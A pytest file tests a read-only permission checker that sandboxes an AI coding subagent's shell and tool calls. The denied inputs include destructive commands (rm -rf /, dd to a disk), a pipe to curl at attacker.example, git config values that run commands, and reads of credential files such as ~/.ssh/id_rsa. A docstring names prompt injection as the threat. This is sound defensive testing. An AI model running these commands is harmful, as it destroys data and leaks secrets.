from pathlib import Path

import pytest

pytest.importorskip("claude_agent_sdk")

from claude_agent_sdk.types import (  # noqa: E402
    PermissionResultAllow,
    PermissionResultDeny,
    ToolPermissionContext,
)

from agents.subagents.claude_code.permissions import (  # noqa: E402
    check_bash_command,
    create_read_only_tool_handler,
    get_git_subcommand,
)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

# Every command is validated against a repository root — the path the
# subagent was pointed at. Paths under it are in scope; everything else on
# the filesystem is not.
REPO_ROOT = Path("/repo")

read_only_tool_handler = create_read_only_tool_handler(REPO_ROOT)


def _allowed(cmd: str) -> bool:
    return isinstance(check_bash_command(cmd, REPO_ROOT), PermissionResultAllow)


def _denied(cmd: str) -> bool:
    return isinstance(check_bash_command(cmd, REPO_ROOT), PermissionResultDeny)


def _deny_message(cmd: str) -> str:
    result = check_bash_command(cmd, REPO_ROOT)
    assert isinstance(result, PermissionResultDeny)
    return result.message


# ---------------------------------------------------------------------------
# get_git_subcommand
# ---------------------------------------------------------------------------


class TestGetGitSubcommand:
    """Tests for extracting the git subcommand from argument lists."""

    def test_simple_subcommand(self) -> None:
        assert get_git_subcommand(["log"]) == "log"

    def test_subcommand_with_args(self) -> None:
        assert get_git_subcommand(["log", "--oneline", "HEAD~5..HEAD"]) == "log"

    def test_dash_c_flag(self) -> None:
        assert get_git_subcommand(["-C", "/path/to/repo", "log"]) == "log"

    def test_dash_c_with_extra_args(self) -> None:
        assert get_git_subcommand(["-C", "/repo", "diff", "--stat", "HEAD~1"]) == "diff"

    def test_git_dir_flag(self) -> None:
        assert get_git_subcommand(["--git-dir", "/repo/.git", "status"]) == "status"

    def test_work_tree_flag(self) -> None:
        assert get_git_subcommand(["--work-tree", "/repo", "ls-files"]) == "ls-files"

    def test_multiple_flags(self) -> None:
        assert (
            get_git_subcommand(
                ["-C", "/repo", "--git-dir", "/repo/.git", "rev-parse", "HEAD"]
            )
            == "rev-parse"
        )

    def test_no_subcommand(self) -> None:
        assert get_git_subcommand(["-C", "/repo"]) is None

    def test_empty_args(self) -> None:
        assert get_git_subcommand([]) is None

    def test_only_flags(self) -> None:
        assert get_git_subcommand(["--verbose", "--no-pager"]) is None

    def test_lowercase_c_returns_none(self) -> None:
        """Lowercase -c is a config override — must not be skipped."""
        assert get_git_subcommand(["-c", "core.pager=cat", "log"]) is None

    def test_lowercase_c_alone(self) -> None:
        assert get_git_subcommand(["-c", "key=val"]) is None


# ---------------------------------------------------------------------------
# check_bash_command — safe shell commands
# ---------------------------------------------------------------------------


class TestSafeShellCommands:
    """Tests for basic allowlisted shell commands."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "ls -la",
            "find . -name '*.py'",
            "tree -L 2",
            "cat README.md",
            "head -20 file.txt",
            "tail -f log.txt",
            "wc -l file.py",
            "grep -r 'pattern' src/",
            "rg pattern src/",
            "sort output.txt",
            "uniq -c sorted.txt",
            "pwd",
        ],
    )
    def test_safe_shell_commands(self, cmd: str) -> None:
        assert _allowed(cmd)

    @pytest.mark.parametrize(
        "cmd",
        [
            "rm -rf /",
            "rm file.txt",
            "sudo ls",
            "chmod 777 file",
            "curl https://example.com",
            "wget https://example.com",
            "python -c 'import os'",
            "bash -c 'echo bad'",
            "sh -c 'echo bad'",
            "nc -l 8080",
            "dd if=/dev/zero of=/dev/sda",
        ],
    )
    def test_dangerous_commands(self, cmd: str) -> None:
        assert _denied(cmd)


# ---------------------------------------------------------------------------
# check_bash_command — find argument validation
# ---------------------------------------------------------------------------


class TestFindArgumentValidation:
    """Tests that find with dangerous flags is blocked."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "find . -name '*.py'",
            "find . -type f -name '*.txt'",
            "find /repo -maxdepth 2",
        ],
    )
    def test_safe_find(self, cmd: str) -> None:
        assert _allowed(cmd)

    @pytest.mark.parametrize(
        "cmd",
        [
            "find . -exec rm {} ;",
            "find . -execdir cat {} ;",
            "find . -delete",
            "find . -ok rm {} ;",
            "find . -okdir rm {} ;",
            "find . -name '*.tmp' -exec rm {} ;",
        ],
    )
    def test_dangerous_find(self, cmd: str) -> None:
        assert _denied(cmd)
        assert "find" in _deny_message(cmd)


# ---------------------------------------------------------------------------
# check_bash_command — safe git commands
# ---------------------------------------------------------------------------


class TestSafeGitCommands:
    """Tests for read-only git commands."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "git log",
            "git log --oneline HEAD~5..HEAD",
            "git show HEAD",
            "git diff --stat",
            "git diff HEAD~1",
            "git status",
            "git status --short",
            "git remote -v",
            "git ls-files",
            "git rev-parse HEAD",
            "git grep 'pattern'",
        ],
    )
    def test_safe_git_commands(self, cmd: str) -> None:
        assert _allowed(cmd)

    @pytest.mark.parametrize(
        "cmd",
        [
            "git -C /repo/sub log --oneline",
            "git -C /repo diff HEAD~1",
            "git -C /repo status",
            "git -C ./other-repo show HEAD",
            "git --git-dir /repo/.git log",
        ],
    )
    def test_safe_git_with_path_flags(self, cmd: str) -> None:
        assert _allowed(cmd)

    @pytest.mark.parametrize(
        "cmd",
        [
            "git commit -m 'msg'",
            "git push origin main",
            "git reset --hard HEAD~1",
            "git checkout main",
            "git merge feature",
            "git rebase main",
            "git stash",
            "git clean -fd",
            "git worktree add /tmp/wt",
            "git gc",
            "git add .",
            "git mv old.py new.py",
            "git fetch origin",
            "git pull",
            "git cherry-pick abc123",
            "git revert HEAD",
            "git rm file.py",
        ],
    )
    def test_dangerous_git_commands(self, cmd: str) -> None:
        assert _denied(cmd)


# ---------------------------------------------------------------------------
# check_bash_command — git branch / tag flag validation
# ---------------------------------------------------------------------------


class TestGitBranchTagFlags:
    """Tests that git branch/tag are only allowed in read-only mode."""

    # --- branch: read-only usage ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "git branch",
            "git branch -a",
            "git branch -r",
            "git branch -l",
            "git branch --list",
            "git branch -v",
            "git branch --verbose",
            "git branch --contains abc123",
            "git branch --merged",
            "git branch --no-merged",
        ],
    )
    def test_git_branch_read_only(self, cmd: str) -> None:
        assert _allowed(cmd)

    # --- branch: mutating usage ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "git branch -d feature",
            "git branch -D feature",
            "git branch --delete feature",
            "git branch -m old new",
            "git branch -M old new",
            "git branch --move old new",
            "git branch -c old new",
            "git branch -C old new",
            "git branch --copy old new",
            "git branch --edit-description",
        ],
    )
    def test_git_branch_mutating(self, cmd: str) -> None:
        assert _denied(cmd)
        assert "mutating" in _deny_message(cmd)

    # --- tag: read-only usage ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "git tag",
            "git tag -l",
            "git tag --list",
            "git tag -l 'v1.*'",
            "git tag -n",
            "git tag --contains abc123",
            "git tag --sort=-creatordate",
        ],
    )
    def test_git_tag_read_only(self, cmd: str) -> None:
        assert _allowed(cmd)

    # --- tag: mutating usage ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "git tag -d v1.0.0",
            "git tag --delete v1.0.0",
            "git tag -a v2.0.0 -m 'Release'",
            "git tag --annotate v2.0.0",
            "git tag -s v2.0.0",
            "git tag --sign v2.0.0",
            "git tag -f v1.0.0",
            "git tag --force v1.0.0",
        ],
    )
    def test_git_tag_mutating(self, cmd: str) -> None:
        assert _denied(cmd)
        assert "mutating" in _deny_message(cmd)


# ---------------------------------------------------------------------------
# check_bash_command — cd validation
# ---------------------------------------------------------------------------


class TestCdValidation:
    """Tests for cd path restrictions."""

    def test_cd_relative_path(self) -> None:
        assert _allowed("cd subrepo")

    def test_cd_relative_dotdot_escaping_repo(self) -> None:
        """``..`` that leaves the repository is refused like an absolute path."""
        assert _denied("cd ../other-repo")

    def test_cd_relative_nested(self) -> None:
        assert _allowed("cd src/components")

    def test_cd_no_arg(self) -> None:
        assert _allowed("cd")

    def test_cd_absolute_path_blocked(self) -> None:
        assert _denied("cd /root")

    def test_cd_absolute_path_usr(self) -> None:
        assert _denied("cd /usr/local/bin")


# ---------------------------------------------------------------------------
# check_bash_command — compound commands
# ---------------------------------------------------------------------------


class TestCompoundCommands:
    """Tests for &&, ;, ||, and pipe combinations."""

    def test_cd_and_git_log(self) -> None:
        assert _allowed("cd subrepo && git log")

    def test_cd_relative_dotdot_and_git_diff(self) -> None:
        assert _allowed("cd ../repo && git diff HEAD~1")

    def test_cd_absolute_and_ls_blocked(self) -> None:
        assert _denied("cd /root && ls")

    def test_cd_absolute_and_git_blocked(self) -> None:
        assert _denied("cd /etc && git log")

    def test_multiple_safe_commands_chained(self) -> None:
        assert _allowed("cd subrepo && git log && git diff")

    def test_safe_then_dangerous_blocked(self) -> None:
        assert _denied("ls -la && rm file.txt")

    def test_semicolon_safe(self) -> None:
        assert _allowed("cd subrepo ; git status")

    def test_semicolon_dangerous(self) -> None:
        assert _denied("ls ; git push origin main")

    def test_safe_pipe(self) -> None:
        assert _allowed("git log --oneline | head -20")

    def test_git_grep_pipe_sort(self) -> None:
        assert _allowed("git grep 'TODO' | sort | uniq -c")

    def test_dangerous_pipe_segment(self) -> None:
        assert _denied("git log | python -c 'bad'")

    def test_cd_and_git_pipe(self) -> None:
        assert _allowed("cd subrepo && git log --oneline | head -10")

    def test_git_with_c_flag_full_pipeline(self) -> None:
        assert _allowed("git -C /repo/sub log --oneline HEAD~5..HEAD")

    def test_deny_message_includes_command(self) -> None:
        assert "sudo" in _deny_message("sudo rm -rf /")


# ---------------------------------------------------------------------------
# check_bash_command — injection vector hardening (bashlex)
# ---------------------------------------------------------------------------


class TestInjectionVectors:
    """Tests for command injection attacks that bashlex should block."""

    # --- Command substitution ---

    def test_dollar_paren_substitution(self) -> None:
        assert _denied("cat $(whoami)")

    def test_dollar_paren_in_argument(self) -> None:
        assert _denied("ls $(rm -rf /)")

    def test_backtick_substitution(self) -> None:
        assert _denied("echo `whoami`")

    def test_nested_substitution(self) -> None:
        assert _denied("cat $(echo $(whoami))")

    # --- Process substitution ---

    def test_process_substitution_input(self) -> None:
        assert _denied("diff <(ls dir1) <(ls dir2)")

    def test_process_substitution_output(self) -> None:
        assert _denied("tee >(cat)")

    # --- Output redirects ---

    def test_redirect_overwrite(self) -> None:
        assert _denied("ls > /tmp/out")

    def test_redirect_append(self) -> None:
        assert _denied("ls >> /tmp/out")

    def test_redirect_stderr(self) -> None:
        assert _denied("ls >& /tmp/out")

    def test_redirect_safe_input(self) -> None:
        # Input redirects are read-only — allowed
        assert _allowed("cat < /repo/input.txt")

    # --- Newline injection ---

    def test_newline_injection(self) -> None:
        # bashlex parses newlines as command separators — second command is blocked
        assert _denied("ls\nrm -rf /")

    def test_newline_with_safe_commands(self) -> None:
        assert _allowed("ls\npwd")

    # --- Parse failures (default-deny) ---

    def test_empty_command(self) -> None:
        assert _denied("")

    def test_malformed_syntax(self) -> None:
        # Unmatched quotes, broken pipes, etc.
        assert _denied("echo 'unclosed")

    # --- Mixed safe + injection ---

    def test_safe_command_with_substitution(self) -> None:
        assert _denied("grep $(cat /etc/passwd) file.txt")

    def test_safe_pipe_with_substitution(self) -> None:
        assert _denied("ls | cat $(whoami)")

    def test_compound_with_redirect(self) -> None:
        assert _denied("git log > /tmp/log && ls")

    def test_or_operator_safe(self) -> None:
        assert _allowed("ls || pwd")

    def test_or_operator_dangerous(self) -> None:
        assert _denied("ls || rm -rf /")


# ---------------------------------------------------------------------------
# check_bash_command — git -c config override (command execution)
# ---------------------------------------------------------------------------


class TestGitConfigOverride:
    """git -c key=value can set config that causes git to execute commands."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "git -c core.pager='rm -rf /' log",
            "git -c diff.external='malicious' diff",
            "git -c core.fsmonitor='malicious' status",
            "git -c credential.helper='!malicious' remote -v",
            "git -c core.sshCommand='malicious' remote -v",
            "git -c alias.log='!rm -rf /' log",
            "git -c core.hooksPath=/tmp/evil status",
            "git -c filter.evil.clean='rm -rf /' diff",
        ],
    )
    def test_git_config_override_blocked(self, cmd: str) -> None:
        assert _denied(cmd)


# ---------------------------------------------------------------------------
# check_bash_command — allowlisted commands with write flags
# ---------------------------------------------------------------------------


class TestAllowlistedCommandWriteFlags:
    """Commands in the allowlist that have flags capable of writing to files."""

    # --- sort -o writes output to a file ---

    def test_sort_output_flag(self) -> None:
        assert _denied("sort -o output.txt input.txt")

    def test_sort_output_flag_long(self) -> None:
        assert _denied("sort --output=output.txt input.txt")

    # --- tree -o writes output to a file ---

    def test_tree_output_flag(self) -> None:
        assert _denied("tree -o output.txt")

    # --- find with write flags not in FIND_DANGEROUS_FLAGS ---

    def test_find_fprint(self) -> None:
        assert _denied("find . -fprint /tmp/output")

    def test_find_fls(self) -> None:
        assert _denied("find . -fls /tmp/output")

    def test_find_fprintf(self) -> None:
        assert _denied("find . -fprintf /tmp/output '%p\\n'")

    # --- git diff --output writes diff to a file ---

    def test_git_diff_output_equals(self) -> None:
        assert _denied("git diff --output=/tmp/diff.txt")

    def test_git_diff_output_space(self) -> None:
        assert _denied("git diff --output /tmp/diff.txt")


# ---------------------------------------------------------------------------
# check_bash_command — git remote mutations
# ---------------------------------------------------------------------------


class TestGitRemoteMutations:
    """git remote is in SAFE_GIT_SUBCOMMANDS but has mutating sub-subcommands."""

    # --- read-only remote usage (should stay allowed) ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "git remote",
            "git remote -v",
            "git remote show origin",
            "git remote get-url origin",
        ],
    )
    def test_git_remote_read_only(self, cmd: str) -> None:
        assert _allowed(cmd)

    # --- mutating remote usage ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "git remote add evil https://evil.com",
            "git remote remove origin",
            "git remote rm origin",
            "git remote rename origin backup",
            "git remote set-url origin https://evil.com",
            "git remote prune origin",
            "git remote set-head origin main",
            "git remote set-branches origin main",
        ],
    )
    def test_git_remote_mutating(self, cmd: str) -> None:
        assert _denied(cmd)


# ---------------------------------------------------------------------------
# check_bash_command — git branch/tag creation via positional args
# ---------------------------------------------------------------------------


class TestGitBranchTagCreation:
    """Creating branches/tags with positional args (no flag) is a write op."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "git branch new-feature",
            "git branch new-feature HEAD~3",
            "git branch new-feature abc123",
        ],
    )
    def test_git_branch_create(self, cmd: str) -> None:
        assert _denied(cmd)

    @pytest.mark.parametrize(
        "cmd",
        [
            "git tag v2.0.0",
            "git tag v2.0.0 abc123",
        ],
    )
    def test_git_tag_create_lightweight(self, cmd: str) -> None:
        assert _denied(cmd)

    # --- Missing mutating branch flags ---

    @pytest.mark.parametrize(
        "cmd",
        [
            "git branch --set-upstream-to=origin/main",
            "git branch -u origin/main",
            "git branch --unset-upstream",
        ],
    )
    def test_git_branch_tracking_mutations(self, cmd: str) -> None:
        assert _denied(cmd)


# ---------------------------------------------------------------------------
# check_bash_command — cd bypass with flags
# ---------------------------------------------------------------------------


class TestCdFlagBypass:
    """cd with flags before the path can bypass the absolute path check."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "cd -P /root",
            "cd -L /root",
            "cd -e /root",
            "cd -- /root",
            "cd -P /etc",
            "cd -L /usr/local/bin",
        ],
    )
    def test_cd_flag_then_absolute_path(self, cmd: str) -> None:
        assert _denied(cmd)

    def test_cd_tilde_expansion(self) -> None:
        assert _denied("cd ~")

    def test_cd_tilde_subpath(self) -> None:
        assert _denied("cd ~/../../root")

    def test_cd_dash_previous_dir(self) -> None:
        # cd - returns to previous directory (could be absolute)
        assert _denied("cd -")

    def test_cd_env_variable(self) -> None:
        assert _denied("cd $HOME")


# ---------------------------------------------------------------------------
# check_bash_command — compound/structural constructs
# ---------------------------------------------------------------------------


class TestShellStructuralConstructs:
    """Loops, conditionals, subshells, and function defs with dangerous bodies."""

    def test_subshell_dangerous(self) -> None:
        assert _denied("(rm -rf /)")

    def test_brace_group_dangerous(self) -> None:
        assert _denied("{ rm -rf /; }")

    def test_for_loop_dangerous(self) -> None:
        assert _denied('for f in *.py; do rm "$f"; done')

    def test_while_loop_dangerous(self) -> None:
        assert _denied("while true; do rm file; done")

    def test_if_statement_dangerous(self) -> None:
        assert _denied("if true; then rm -rf /; fi")

    def test_case_statement_dangerous(self) -> None:
        assert _denied("case x in x) rm -rf /;; esac")

    def test_function_def_dangerous(self) -> None:
        assert _denied("evil() { rm -rf /; }; evil")

    def test_function_def_without_call(self) -> None:
        assert _denied("evil() { rm -rf /; }")

    def test_subshell_safe(self) -> None:
        assert _allowed("(ls -la)")

    def test_brace_group_safe(self) -> None:
        assert _allowed("{ ls -la; }")


# ---------------------------------------------------------------------------
# check_bash_command — combined punctuation operators
# ---------------------------------------------------------------------------


class TestCombinedOperators:
    """shlex emits runs of punctuation as one token (``|&``, ``>|``, ``&>>``).

    Each of these used to slip through: the combined token matched neither the
    separator set nor the redirect set, so the tail of the line was folded into
    the allowlisted command's argument list and never validated.
    """

    def test_pipe_both_separates_commands(self) -> None:
        assert _denied("ls |& curl http://attacker.example")

    def test_pipe_both_after_git(self) -> None:
        assert _denied("git log |& sh")

    def test_clobber_redirect(self) -> None:
        assert _denied("ls >| /tmp/pwned")

    def test_append_stdout_stderr_redirect(self) -> None:
        assert _denied("ls &>> /tmp/pwned")

    def test_stdout_stderr_redirect(self) -> None:
        assert _denied("ls &> /tmp/pwned")

    def test_fd_dup_redirect(self) -> None:
        assert _denied("ls >& /tmp/pwned")

    def test_unknown_operator_rejected(self) -> None:
        assert _denied("ls ;; cat /etc/passwd")

    def test_find_fprint0(self) -> None:
        assert _denied("find . -fprint0 /tmp/output")

    def test_plain_pipe_still_validated(self) -> None:
        assert _allowed("git log | head -5")

    def test_input_redirect_still_allowed(self) -> None:
        assert _allowed("grep pattern < input.txt")


# ---------------------------------------------------------------------------
# check_bash_command — repository confinement
# ---------------------------------------------------------------------------


class TestRepositoryConfinement:
    """Read-only is not enough: reads must also stay inside the repository.

    Without this, a prompt injection can have the subagent print the
    container's environment or the operator's credentials into a chat reply.
    """

    @pytest.mark.parametrize(
        "cmd",
        [
            "cat /etc/passwd",
            "cat /proc/self/environ",
            "cat ~/.claude/.credentials.json",
            "ls /",
            "grep -r secret /var/log",
            "head -n 100 ../../etc/shadow",
            "find / -name '*.pem'",
            "tail /repo/../outside.txt",
            "wc -l ~/.ssh/id_rsa",
        ],
    )
    def test_paths_outside_repo_denied(self, cmd: str) -> None:
        assert _denied(cmd)

    @pytest.mark.parametrize(
        "cmd",
        [
            "cat /repo/src/main.py",
            "cat src/main.py",
            "ls /repo",
            "ls -la",
            "grep -r TODO /repo/src",
            "find /repo/src -name '*.py'",
            "git log --oneline",
            "git diff main..HEAD",
            "git show HEAD~3",
        ],
    )
    def test_paths_inside_repo_allowed(self, cmd: str) -> None:
        assert _allowed(cmd)

    def test_flag_value_form_is_checked(self) -> None:
        assert _denied("grep --file=/etc/passwd pattern")

    @pytest.mark.parametrize(
        "cmd",
        [
            "cat $HOME/.aws/credentials",
            "cat ${HOME}/.ssh/id_rsa",
            "ls $REPO_PARENT",
        ],
    )
    def test_variable_expansion_denied(self, cmd: str) -> None:
        """The shell expands these after our check, so the path is unknowable."""
        assert _denied(cmd)

    def test_trailing_dollar_is_not_an_expansion(self) -> None:
        """``grep 'foo$'`` is a regex anchor, not a variable."""
        assert _allowed("grep 'foo$' src/main.py")

    def test_git_revision_syntax_is_not_a_path(self) -> None:
        """``HEAD~1``/``main..HEAD`` must not be mistaken for path escapes."""
        assert _allowed("git log HEAD~5..HEAD")
        assert _allowed("git diff main..feature")

    def test_denial_names_the_offending_path(self) -> None:
        assert "/etc/passwd" in _deny_message("cat /etc/passwd")

    def test_unknown_command_still_reported_as_such(self) -> None:
        """Command-level denial takes priority over the path message."""
        assert "sudo" in _deny_message("sudo cat /etc/passwd")


# ---------------------------------------------------------------------------
# check_bash_command — git grep pager execution
# ---------------------------------------------------------------------------


class TestGitGrepPager:
    """``git grep -O`` runs a program over the matches — command execution."""

    def test_open_files_in_pager_long(self) -> None:
        assert _denied("git grep --open-files-in-pager=/tmp/evil.sh pattern")

    def test_open_files_in_pager_short_inline(self) -> None:
        assert _denied("git grep -O/tmp/evil.sh pattern")

    def test_open_files_in_pager_short_separate(self) -> None:
        assert _denied("git grep -O pattern")

    def test_plain_git_grep_still_allowed(self) -> None:
        assert _allowed("git grep -n pattern")


# ---------------------------------------------------------------------------
# check_bash_command — additional edge cases
# ---------------------------------------------------------------------------


class TestAdditionalEdgeCases:
    """Various edge cases and bypass attempts."""

    # --- stderr redirects ---

    def test_stderr_to_file(self) -> None:
        assert _denied("ls 2> /tmp/err")

    def test_stderr_and_stdout_to_file(self) -> None:
        assert _denied("ls &> /tmp/all")

    def test_stderr_to_stdout(self) -> None:
        # 2>&1 is an output redirect to fd — should be blocked for safety
        assert _denied("ls 2>&1")

    def test_dev_null_redirect(self) -> None:
        assert _denied("ls > /dev/null")

    # --- background execution ---

    def test_background_safe(self) -> None:
        # Background should be blocked (uncontrollable execution)
        assert _denied("sleep 999 &")

    def test_background_with_allowlisted(self) -> None:
        # ls & is still read-only — background doesn't change safety
        assert _allowed("ls &")

    # --- commands that look safe but aren't ---

    def test_cp_command(self) -> None:
        assert _denied("cp file1 file2")

    def test_mv_command(self) -> None:
        assert _denied("mv old.py new.py")

    def test_mkdir_command(self) -> None:
        assert _denied("mkdir new_dir")

    def test_touch_command(self) -> None:
        assert _denied("touch new_file")

    def test_ln_command(self) -> None:
        assert _denied("ln -s target link")

    def test_tee_command(self) -> None:
        assert _denied("ls | tee output.txt")

    def test_xargs_command(self) -> None:
        assert _denied("find . | xargs rm")

    def test_sed_command(self) -> None:
        assert _denied("sed -i 's/old/new/' file.py")

    def test_awk_command(self) -> None:
        assert _denied("awk '{print}' file.py > output.txt")

    def test_install_command(self) -> None:
        assert _denied("install -m 755 script /usr/bin/")

    def test_truncate_command(self) -> None:
        assert _denied("truncate -s 0 file.txt")

    # --- whitespace and encoding tricks ---

    def test_tab_separated(self) -> None:
        assert _denied("rm\t-rf\t/")

    def test_multiple_spaces(self) -> None:
        assert _denied("rm    -rf    /")

    def test_trailing_whitespace(self) -> None:
        assert _allowed("ls -la   ")

    # --- chained safe commands should still work ---

    def test_long_safe_pipeline(self) -> None:
        assert _allowed("git log --oneline | grep pattern | sort | uniq -c | head -10")

    def test_multiple_git_commands(self) -> None:
        assert _allowed("git status && git log --oneline -5 && git diff --stat")


# ---------------------------------------------------------------------------
# read_only_tool_handler (async)
# ---------------------------------------------------------------------------


class TestReadOnlyToolHandler:
    """Tests for the top-level SDK permission callback."""

    @staticmethod
    def _make_context() -> ToolPermissionContext:
        return ToolPermissionContext(signal=None, suggestions=[])

    # --- Auto-allowed tools ---

    @pytest.mark.asyncio
    async def test_allows_read(self) -> None:
        ctx = self._make_context()
        result = await read_only_tool_handler(
            "Read", {"file_path": "/repo/src/main.py"}, ctx
        )
        assert isinstance(result, PermissionResultAllow)
        assert result.updated_input == {"file_path": "/repo/src/main.py"}

    @pytest.mark.asyncio
    async def test_allows_grep(self) -> None:
        result = await read_only_tool_handler(
            "Grep", {"pattern": "TODO"}, self._make_context()
        )
        assert isinstance(result, PermissionResultAllow)

    @pytest.mark.asyncio
    async def test_allows_glob(self) -> None:
        result = await read_only_tool_handler(
            "Glob", {"pattern": "**/*.py"}, self._make_context()
        )
        assert isinstance(result, PermissionResultAllow)

    # --- MCP tools ---

    @pytest.mark.asyncio
    async def test_allows_mcp_project_tool(self) -> None:
        result = await read_only_tool_handler(
            "mcp__project_tools__get_issue_info", {"id": "123"}, self._make_context()
        )
        assert isinstance(result, PermissionResultAllow)

    @pytest.mark.asyncio
    async def test_allows_any_mcp_tool(self) -> None:
        result = await read_only_tool_handler(
            "mcp__custom__my_tool", {"arg": "val"}, self._make_context()
        )
        assert isinstance(result, PermissionResultAllow)

    # --- Bash: allowed commands ---

    @pytest.mark.asyncio
    async def test_allows_bash_ls(self) -> None:
        result = await read_only_tool_handler(
            "Bash", {"command": "ls -la"}, self._make_context()
        )
        assert isinstance(result, PermissionResultAllow)
        assert result.updated_input == {"command": "ls -la"}

    @pytest.mark.asyncio
    async def test_allows_bash_git_log(self) -> None:
        result = await read_only_tool_handler(
            "Bash",
            {"command": "git -C /repo log --oneline HEAD~5..HEAD"},
            self._make_context(),
        )
        assert isinstance(result, PermissionResultAllow)

    @pytest.mark.asyncio
    async def test_allows_bash_cd_relative_and_git(self) -> None:
        result = await read_only_tool_handler(
            "Bash", {"command": "cd subrepo && git log"}, self._make_context()
        )
        assert isinstance(result, PermissionResultAllow)

    # --- Bash: blocked commands ---

    @pytest.mark.asyncio
    async def test_blocks_bash_git_commit(self) -> None:
        result = await read_only_tool_handler(
            "Bash", {"command": "git commit -m 'msg'"}, self._make_context()
        )
        assert isinstance(result, PermissionResultDeny)

    @pytest.mark.asyncio
    async def test_blocks_bash_rm(self) -> None:
        result = await read_only_tool_handler(
            "Bash", {"command": "rm -rf /"}, self._make_context()
        )
        assert isinstance(result, PermissionResultDeny)

    @pytest.mark.asyncio
    async def test_blocks_bash_cd_absolute(self) -> None:
        result = await read_only_tool_handler(
            "Bash", {"command": "cd /root && ls"}, self._make_context()
        )
        assert isinstance(result, PermissionResultDeny)

    @pytest.mark.asyncio
    async def test_blocks_bash_empty_command(self) -> None:
        result = await read_only_tool_handler(
            "Bash", {"command": ""}, self._make_context()
        )
        assert isinstance(result, PermissionResultDeny)

    @pytest.mark.asyncio
    async def test_blocks_bash_no_command_key(self) -> None:
        result = await read_only_tool_handler("Bash", {}, self._make_context())
        assert isinstance(result, PermissionResultDeny)

    @pytest.mark.asyncio
    async def test_blocks_bash_command_substitution(self) -> None:
        result = await read_only_tool_handler(
            "Bash", {"command": "cat $(whoami)"}, self._make_context()
        )
        assert isinstance(result, PermissionResultDeny)

    @pytest.mark.asyncio
    async def test_blocks_bash_output_redirect(self) -> None:
        result = await read_only_tool_handler(
            "Bash", {"command": "ls > /tmp/out"}, self._make_context()
        )
        assert isinstance(result, PermissionResultDeny)

    # --- Blocked tools ---

    @pytest.mark.asyncio
    async def test_blocks_write(self) -> None:
        result = await read_only_tool_handler(
            "Write", {"file_path": "/tmp/f", "content": "x"}, self._make_context()
        )
        assert isinstance(result, PermissionResultDeny)
        assert "read-only" in result.message

    @pytest.mark.asyncio
    async def test_blocks_edit(self) -> None:
        result = await read_only_tool_handler(
            "Edit", {"file_path": "/tmp/f"}, self._make_context()
        )
        assert isinstance(result, PermissionResultDeny)

    @pytest.mark.asyncio
    async def test_blocks_unknown_tool(self) -> None:
        result = await read_only_tool_handler(
            "SomeNewTool", {"arg": "val"}, self._make_context()
        )
        assert isinstance(result, PermissionResultDeny)
        assert "SomeNewTool" in result.message


# ---------------------------------------------------------------------------
# check_bash_command — diff options shared by log / show / diff
# ---------------------------------------------------------------------------


class TestGitDiffRenderingOptions:
    """``log`` and ``show`` take the whole ``diff`` option surface.

    Regression: ``--output`` used to be blocked on ``git diff`` only, so an
    agent asked to "save the history" could ``git log --output=notes.txt``.
    """

    @pytest.mark.parametrize("subcmd", ["log", "show", "diff"])
    def test_output_equals_form_denied(self, subcmd: str) -> None:
        assert _denied(f"git {subcmd} --output=notes.txt")

    @pytest.mark.parametrize("subcmd", ["log", "show", "diff"])
    def test_output_space_form_denied(self, subcmd: str) -> None:
        assert _denied(f"git {subcmd} --output notes.txt HEAD")

    def test_output_into_git_dir_denied(self) -> None:
        assert _denied(
            "git log -1 --format='[core]%n%x09pager = x' --output=.git/config"
        )

    @pytest.mark.parametrize("subcmd", ["log", "show", "diff"])
    @pytest.mark.parametrize("flag", ["--ext-diff", "--textconv"])
    def test_diff_driver_flags_denied(self, subcmd: str, flag: str) -> None:
        assert _denied(f"git {subcmd} {flag}")

    @pytest.mark.parametrize(
        "cmd",
        [
            "git log --output-indicator-new=+",
            "git log -p --no-ext-diff --no-textconv",
            "git show --stat HEAD",
            "git diff --stat --relative",
            "git log --format='%H %s' -n 5",
        ],
    )
    def test_harmless_diff_options_allowed(self, cmd: str) -> None:
        assert _allowed(cmd)

    def test_denial_names_flag_and_subcommand(self) -> None:
        message = _deny_message("git show --output=x HEAD")
        assert "git show" in message and "--output" in message


# ---------------------------------------------------------------------------
# check_bash_command — git top-level options
# ---------------------------------------------------------------------------


class TestGitTopLevelOptions:
    """Options that inject configuration or executables before the subcommand.

    Regression: only ``-c`` was refused; ``--config-env`` sets the same
    configuration from an environment variable and slipped through.
    """

    @pytest.mark.parametrize(
        "cmd",
        [
            "git --config-env=diff.external=EVIL diff",
            "git --config-env diff.external=EVIL diff",
            "git --exec-path=/tmp/x log",
            "git --exec-path /tmp/x log",
            "git --exec-path log",
            "git -p log",
            "git --paginate log",
            "git -C src --config-env=core.pager=X status",
        ],
    )
    def test_injecting_options_denied(self, cmd: str) -> None:
        assert _denied(cmd)

    @pytest.mark.parametrize(
        "cmd",
        [
            "git -P log",
            "git --no-pager log --oneline",
            "git log -p",
            "git -C src status",
        ],
    )
    def test_benign_top_level_options_allowed(self, cmd: str) -> None:
        """``-p`` after the subcommand is ``--patch``; before it, the pager."""
        assert _allowed(cmd)

    def test_get_git_subcommand_stops_at_blocked_option(self) -> None:
        assert get_git_subcommand(["--config-env=a=B", "log"]) is None
        assert get_git_subcommand(["--exec-path=/x", "log"]) is None
        assert get_git_subcommand(["--paginate", "log"]) is None


# ---------------------------------------------------------------------------
# check_bash_command — every argument is resolved, symlinks included
# ---------------------------------------------------------------------------


class TestSymlinkResolution:
    """Plain relative names are resolved too, so a symlink's target decides.

    Regression: only arguments that *looked* like escapes (absolute, ``~``,
    ``..``) were checked, so ``cat creds`` passed even when ``creds`` was a
    symlink to a file outside the repository.
    """

    @pytest.fixture
    def root(self, tmp_path: Path) -> Path:
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "secret").write_text("SECRET")
        repo = tmp_path / "repo"
        (repo / "sub").mkdir(parents=True)
